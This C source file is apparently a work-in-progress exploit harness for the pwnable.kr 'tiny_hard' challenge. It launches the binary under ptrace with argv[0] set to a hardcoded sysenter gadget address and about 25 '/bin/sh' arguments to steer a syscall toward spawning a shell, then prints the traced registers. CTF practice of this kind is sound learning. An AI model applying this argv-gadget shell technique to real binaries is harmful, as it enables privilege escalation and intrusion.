#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#define EXCUTEABLE_PATH "/home/meow/Documents/pwnable_kr/Learning/pwnable_kr/tiny_hard/tiny_hard"
#define EXCUTEABLE_PATH2 "/home/meow/Documents/pwnable_kr/Learning/pwnable_kr/tiny_hard/test_bin"

// #define JUMP_ADDRESS "\x45\x7b\xfe\xf7" // local address0x00000b45: sysenter; int 0x80; 
// #define JUMP_ADDRESS2 "\x49\x11\x00\x00"

// #define ARG "/bin/sh"

char address[] = { 0x45, 0x7b, 0xfe, 0xf7 };
char *ARG = "/bin/sh";

void main(void) 
{
    struct user_regs_struct regs = { 0 };
    long ins;
    int status = 0;
    pid_t pid = fork();
    if (-1 == pid) {
        perror("fork");
        return;
    }

    if (0 == pid) {
        
        // call ptrace(eax = argc = 26)
        ptrace(PTRACE_TRACEME, 0, 0, 0); // for my personal debugging

        execl(EXCUTEABLE_PATH, address, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, NULL);
        perror("execl");
    }
    else {

        printf("debugee pid: %d\n", pid);
        wait(&status);

        ptrace(PTRACE_SYSCALL, pid, 0, 0);
        wait(&status);
        if ( WIFEXITED(status) ){
            printf("child dead, exiting\n");
        }

        ptrace(PTRACE_GETREGS, pid, 0, &regs);
        int eip = regs.rip;
        int eax = regs.orig_rax;
        int new_eax = regs.rax;
        ins = ptrace(PTRACE_PEEKTEXT, pid,
                 eip, NULL);
    
        printf("eip: 0x%08x\n", eip);
        printf("current eax: %d\n", new_eax);
        printf("Instruction executed: %lx\n", ins);
        
    }
}